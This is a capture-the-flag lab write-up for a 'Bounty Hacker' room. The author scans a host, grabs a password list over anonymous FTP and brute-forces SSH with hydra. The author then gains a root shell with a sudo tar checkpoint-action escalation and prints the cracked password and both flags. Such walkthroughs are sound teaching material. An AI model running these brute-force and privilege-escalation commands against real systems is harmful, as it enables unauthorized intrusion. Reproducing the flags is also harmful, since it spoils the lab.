
You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!



## Writeup

1) Started out with nmap scan and found:



```shell
$ nmap -sS -O 10.10.12.96

Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-19 09:35 EST
Nmap scan report for 10.10.12.96 (10.10.12.96)
Host is up (0.20s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
Aggressive OS guesses: Linux 2.6.32 - 3.13 (93%), Linux 4.15 (93%), Linux 3.10 - 4.11 (91%), Android 9 - 10 (Linux 4.9 - 4.14) (90%), Linux 3.2 - 4.14 (90%), Linux 4.15 - 5.19 (90%), Linux 2.6.32 - 3.10 (90%), HP P2000 G3 NAS device (89%), Linux 5.0 - 5.14 (89%), Infomir MAG-250 set-top box (88%)
No exact OS matches for host (test conditions non-ideal).

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds

```


2) Logged into ftp as Anonymous:

```shell
$ ftp 10.10.12.96
```


3) In FTP, I listed the files and got two txt files which i then transfered it into my machine using get command.

```shell
ftp> ls
locks.txt
task.txt

ftp> get locks.txt task.txt
```


4) I read both the files:

```shell
$ cat locks.txt

rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e

```


```shell
$ cat task.txt

1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Success! I found out the username of the user!

and it seems there is a possible number of password for the SSH!

5) I tried bruteforcing using hydra:

```shell
$ hydra -l lin -P ~/Downloads/locks.txt -t 6 ssh://10.10.12.96
```

Output:

```shell
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-19 09:50:56
[DATA] max 6 tasks per 1 server, overall 6 tasks, 26 login tries (l:1/p:26), ~5 tries per task
[DATA] attacking ssh://10.10.12.96:22/
[22][ssh] host: 10.10.12.96   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-19 09:51:05

```

Success!! We cracked the password too!


6) Now time to login and see:

```shell
──(itsjustme㉿kali)-[~/Downloads]
└─$ ssh lin@10.10.12.96 -p 22  
The authenticity of host '10.10.12.96 (10.10.12.96)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.12.96' (ED25519) to the list of known hosts.
lin@10.10.12.96's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
lin@bountyhacker:~/Desktop$ ls
user.txt
lin@bountyhacker:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}

```


GOT the first flag!!!


7) Now on to the root.txt flag!

8) What now left is to find a way to escalate our privileges on the box to become root and eventually capture root flag.

> Try using the command:  
> sudo -l

![](https://miro.medium.com/v2/resize:fit:1000/1*iYundfpW5z7pLoUBBV4_IA.png)

Superb! Now we know that the user lin has the permission to run the /bin/tar as root. That could be immensely helpful for us to escalate privileges.

My first spot is to always go to [https://gtfobins.github.io/](https://gtfobins.github.io/) look for possible privilege escalation commands for elevating the privileges for a specific binary with special permissions.  
Search tar in the search bar and click on tar scroll down to SUDO.

![](https://miro.medium.com/v2/resize:fit:700/1*QDNqNMIY2LBIfn5ZLr1TIw.png)

![](https://miro.medium.com/v2/resize:fit:700/1*BAnNHDNXL27Ub7Y0yxZDEg.png)

Always read the description. It looks pretty good to me. Can’t resist running it and getting root. Let’s see. Fingers crossed.

> sudo tar -cf /dev/null /dev/null — checkpoint=1 — checkpoint-action=exec=/bin/sh

![](https://miro.medium.com/v2/resize:fit:700/1*Cr-M_qa11rDuNNo6LJC1KA.png)

We have successfully elevated our privileges.  
We can confirm we are root now.

9) then just use ls and cat command to get the flag!

```shell
lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
# ls
user.txt
# cd /
# ls
bin    dev   initrd.img      lib64       mnt   root  snap  tmp  vmlinuz
boot   etc   initrd.img.old  lost+found  opt   run   srv   usr  vmlinuz.old
cdrom  home  lib             media       proc  sbin  sys   var
# cd root
# ls
root.txt
# cat root.txt
THM{80UN7Y_h4cK3r}
# Connection to 10.10.12.96 closed by remote host.
Connection to 10.10.12.96 closed.

```

THERE WE GOOOO!!

THE END





